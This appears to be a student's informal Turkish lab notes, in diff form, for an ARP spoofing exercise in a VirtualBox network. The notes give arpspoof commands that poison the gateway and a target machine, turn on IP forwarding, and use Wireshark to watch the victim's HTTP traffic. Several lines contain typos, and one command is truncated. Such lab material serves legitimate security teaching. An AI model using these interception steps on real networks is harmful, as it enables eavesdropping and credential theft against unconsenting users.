@@ -1,0 +1,34 @@
+arp spoofing saldırısı yap
+
+arp slaytındakiuygulamayı yap.
+*"sudo apt-get update" komutunu girin
+*"sudo apt-get upgrade" komutunu girin böylece sisteminizi güncellemiş olacaksınız.	
+
+ağ :takıldı:net ağı
+adı netnetwork
+cmd nslookup www ile ip adresini bulabilirsin
+
+~# apt-get install wireshark
+
+wireshark yaz enterla çalışırsa ok
+
+defaışt gateway
+
+arp zehirleme
+
+~# arpspoof -i (buraya eth0 yazdık root@kali içinde) -t 10.0.2.1 10.0.2.4 (enterla)
+.4 edgeye  2.1 makinesiyim diyip zehirle	 
+yeni bir cmd de client zehirleyelim
+~rpspoof -i eth0 -t 10.0.2.4 10.0.2.1 enteer
+
+.4 target (edge) 				ben sunucuyum diye ehirle
+ve birde ip forwarding yapmalıyız ki yönlendirmeyi yapsın:
+
+~# echo 1 > /proc/sys/net/ipv4/ip_forward(hata almadan)(gelen paketleri direr sunuculara yönlendiriyor)
+
+edgeden internete ağlanmayaçaışıtk(edge makinası virtual box ),birkaç siteye girildi iptal etti
+
+wiresharktan http stream ile http de dönen olaylarını seyret
+
+
+
